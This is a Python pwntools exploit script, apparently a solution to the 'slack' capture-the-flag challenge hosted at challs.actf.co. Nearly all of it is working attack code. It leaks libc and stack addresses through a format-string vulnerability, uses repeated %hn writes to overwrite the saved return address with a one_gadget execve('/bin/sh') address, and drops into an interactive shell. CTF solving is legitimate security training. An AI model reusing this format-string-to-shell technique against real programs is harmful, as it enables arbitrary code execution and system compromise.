#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('slack_patched')
libc = ELF('libc.so.6')

host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 31500)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def WWW(what, where):
    # Put addr on stack
    fmt = f'%{where}c%25$hn'
    assert len(fmt) < 14, f"FMT too long\n{fmt} {len(fmt)}"
    if len(fmt) == 13:
        io.sendafter(b'Professional): ',fmt.encode())
    else:
        io.sendlineafter(b'Professional): ',fmt.encode())

    # Write at the addr
    if what != 0:
        fmt = f'%{what}c%55$hn'
    else:
        fmt = f'%55$n'
    assert len(fmt) < 14, f"FMT too long\n{fmt} {len(fmt)}"
    if len(fmt) == 13:
        io.sendafter(b'Professional): ',fmt.encode())
    else:
        io.sendlineafter(b'Professional): ',fmt.encode())

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *main+402
b *main+453
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

# %21$p __libc_start_call_main+128
# %25$p 0x7ffc4df20568  saved_rip=0x7ffc4df20458 i=0x7ffc4df203e8

io.sendlineafter(b'Professional): ',b'%21$p %25$p')
io.recvuntil(b'You: ')
libc_leak, stack_leak = io.recvline().strip().split()
libc_leak, stack_leak = int(libc_leak,16), int(stack_leak,16)

libc.address = libc_leak - (libc.sym['__libc_start_call_main']+128)
saved_rip = stack_leak - 0x110
i_var = stack_leak - 0x180

log.success(f"{libc.address = :x} {saved_rip = :x} {i_var = :x}")

## Write i_var somewhere on stack
i_var_lsb = i_var & 0xffff
WWW(0Xff, i_var_lsb+3)

"""
0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
"""
ONE_GADGET = libc.address + 0xebcf1
log.info(f"{ONE_GADGET = :x}")

## make rbp-0x78 writable
## write saved_rbp in saved_rbp
srbp = saved_rip-8
WWW(srbp & 0Xffff, srbp & 0Xffff)
WWW((srbp & 0Xffff0000)>> 16, (srbp+2) & 0Xffff)
WWW((srbp & 0Xffff00000000)>> 32, (srbp+4) & 0Xffff)

## write 0 to [rbp-0x70]
srbp = srbp-0x70
WWW(0, srbp & 0Xffff)

## Write one_gadget
WWW(ONE_GADGET & 0Xffff, saved_rip & 0Xffff)
WWW((ONE_GADGET & 0Xffff0000)>> 16, (saved_rip+2) & 0Xffff)
WWW((ONE_GADGET & 0Xffff00000000)>> 32, (saved_rip+4) & 0Xffff)

## Exit prog
WWW(0x0, i_var_lsb+3)

io.interactive()

